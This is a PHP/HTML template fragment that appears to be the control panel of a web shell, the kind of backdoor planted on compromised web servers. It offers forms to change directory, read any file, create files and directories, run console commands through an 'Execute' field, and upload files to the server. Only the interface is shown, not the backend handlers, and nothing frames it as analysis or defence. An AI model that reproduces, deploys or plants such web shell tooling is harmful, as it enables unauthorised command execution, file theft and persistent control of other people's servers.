$w = $this->get('writable');
$dir = $this->get('dir');
?>
<div style="padding-bottom: 100px;">
    <table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%"
           style="border-top:2px solid #333;border-bottom:2px solid #333;">
        <tr>
            <td>
                <form action="">
                    <span>Change dir:</span><br>
                    <input class="toolsInp" type="text" name="Directory" value="<?= htsch($dir) ?>">
                    <input type="submit" value=">>">
                </form>
            </td>
            <td>
                <form onsubmit="a('Filetools','read',null,this.f.value); return false;">
                    <span>Read file:</span><br>
                    <input class='toolsInp' type=text name=f>
                    <input type=submit value='>>'>
                </form>
            </td>
        </tr>
        <tr>
            <td>
                <form onsubmit="a('Filesmanager','createDir',null,this.d.value);return false;">
                    <span>Make dir: </span><?= $w ?><br>
                    <input class='toolsInp' type=text name=d>
                    <input type=submit value='>>'>
                </form>
            </td>
            <td>
                <form onsubmit="a('Filetools','create',null,this.f.value); return false;">
                    <span>Make file: </span><?= $w ?><br>
                    <input class='toolsInp' type=text name=f>
                    <input type=submit value='>>'>
                </form>
            </td>
        </tr>
        <tr>
            <td>
                <form onsubmit="a('Console',null,null,this.c.value);return false;">
                    <span>Execute:</span><br>
                    <input class='toolsInp' type=text name=c value=''>
                    <input type=submit value='>>'>
                </form>
            </td>
            <td>
                <form method='post' ENCTYPE='multipart/form-data' name="ga_upload_files">
                    <input type=hidden name='Module' value='Filesmanager'>
                    <input type=hidden name='Directory' value='<?= $dir ?>'>
                    <input type=hidden name='Action' value='upload'>
                    <input type=hidden name=Charset value="<?= ga()->config('Charset') ?>">
                    <span>Upload file: </span><?= $w ?> <a href="" onclick=" var f = ga.d.getElementById('ga_upload_files');
                        var i= ga.d.createElement('input');i.type='file';i.name='f[]';i.className ='toolsInp';var br = ga.d.createElement('br');
                       f.appendChild(i);f.appendChild(br);return false;">+add</a><br>
                    <span id="ga_upload_files" style="padding-right: 32px;display: block;"></span>
                    <input class='toolsInp' type=file name=f[]>
                    <input type=submit value='>>'><br>

                </form>
                <br></td>
        </tr>
    </table>
</div>
<?php